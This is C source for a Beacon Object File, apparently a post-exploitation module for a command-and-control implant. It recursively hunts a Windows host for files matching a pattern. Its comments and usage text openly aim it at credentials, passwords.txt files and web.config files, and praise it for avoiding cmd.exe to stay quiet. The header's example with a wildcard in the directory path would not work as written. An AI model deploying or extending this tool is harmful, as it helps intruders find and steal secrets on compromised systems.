// bof_find_files.c — search for files by pattern.
//
// Takes a search pattern like "C:\\Users\\*\\Desktop\\*.txt" and recursively
// finds matching files. More flexible than `dir /s` and doesn't touch cmd.exe.
// Useful for hunting credentials, configs, documents, etc.

#include "bof_api.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FindClose(HANDLE hFindFile);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileAttributesA(LPCSTR lpFileName);

static int match_simple_pattern(const char* text, const char* pattern) {
    // Simple glob matching: supports * and ? only
    while (*pattern) {
        if (*pattern == '*') {
            pattern++;
            if (!*pattern) return 1; // trailing * matches everything
            while (*text) {
                if (match_simple_pattern(text, pattern)) return 1;
                text++;
            }
            return 0;
        } else if (*pattern == '?') {
            if (!*text) return 0;
            text++;
            pattern++;
        } else {
            if ((*text | 0x20) != (*pattern | 0x20)) return 0; // case-insensitive
            if (!*text) return 0;
            text++;
            pattern++;
        }
    }
    return !*text;
}

static void search_recursive(const char* base_path, const char* file_pattern, int max_depth) {
    if (max_depth <= 0) return;

    char search_path[512];
    int base_len = 0;
    while (base_path[base_len] && base_len < 500) {
        search_path[base_len] = base_path[base_len];
        base_len++;
    }

    if (base_len > 0 && search_path[base_len-1] != '\\') {
        search_path[base_len++] = '\\';
    }
    search_path[base_len] = '*';
    search_path[base_len+1] = '\0';

    WIN32_FIND_DATAA find_data;
    HANDLE find_handle = KERNEL32$FindFirstFileA(search_path, &find_data);
    if (find_handle == INVALID_HANDLE_VALUE) return;

    do {
        if (find_data.cFileName[0] == '.') continue; // skip . and ..

        char full_path[512];
        int path_pos = 0;
        for (int i = 0; i < base_len-1 && path_pos < 510; i++) {
            full_path[path_pos++] = base_path[i];
        }
        if (path_pos > 0 && full_path[path_pos-1] != '\\') {
            full_path[path_pos++] = '\\';
        }
        for (int i = 0; find_data.cFileName[i] && path_pos < 511; i++) {
            full_path[path_pos++] = find_data.cFileName[i];
        }
        full_path[path_pos] = '\0';

        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Recurse into subdirectory
            search_recursive(full_path, file_pattern, max_depth - 1);
        } else {
            // Check if filename matches pattern
            if (match_simple_pattern(find_data.cFileName, file_pattern)) {
                DWORD size_high = find_data.nFileSizeHigh;
                DWORD size_low = find_data.nFileSizeLow;
                BeaconPrintf(CALLBACK_OUTPUT, "%s [%d bytes]\n", full_path, size_low);
            }
        }
    } while (KERNEL32$FindNextFileA(find_handle, &find_data));

    KERNEL32$FindClose(find_handle);
}

void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int len;
    char* pattern_arg = BeaconDataExtract(&parser, &len);
    if (!pattern_arg || len == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: bof bof_find_files.x64.o <path_pattern>\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Examples:\n");
        BeaconPrintf(CALLBACK_OUTPUT, "  C:\\Users\\*\\*.txt\n");
        BeaconPrintf(CALLBACK_OUTPUT, "  C:\\inetpub\\wwwroot\\*.config\n");
        BeaconPrintf(CALLBACK_OUTPUT, "  C:\\Program Files\\*\\passwords.txt\n");
        return;
    }

    // Extract directory and filename pattern
    char pattern[512];
    int i;
    for (i = 0; i < len && i < 511; i++) {
        pattern[i] = pattern_arg[i];
    }
    pattern[i] = '\0';

    // Find last \ or / to split path and filename
    int last_sep = -1;
    for (i = 0; pattern[i]; i++) {
        if (pattern[i] == '\\' || pattern[i] == '/') {
            last_sep = i;
        }
    }

    if (last_sep == -1) {
        BeaconPrintf(CALLBACK_ERROR, "[find_files] Need full path with pattern\n");
        return;
    }

    char base_path[512];
    char file_pattern[256];

    for (i = 0; i < last_sep && i < 511; i++) {
        base_path[i] = pattern[i];
    }
    base_path[i] = '\0';

    int fp_pos = 0;
    for (i = last_sep + 1; pattern[i] && fp_pos < 255; i++) {
        file_pattern[fp_pos++] = pattern[i];
    }
    file_pattern[fp_pos] = '\0';

    BeaconPrintf(CALLBACK_OUTPUT, "[find_files] Searching for '%s' in '%s'\n", file_pattern, base_path);
    search_recursive(base_path, file_pattern, 10); // max 10 levels deep
}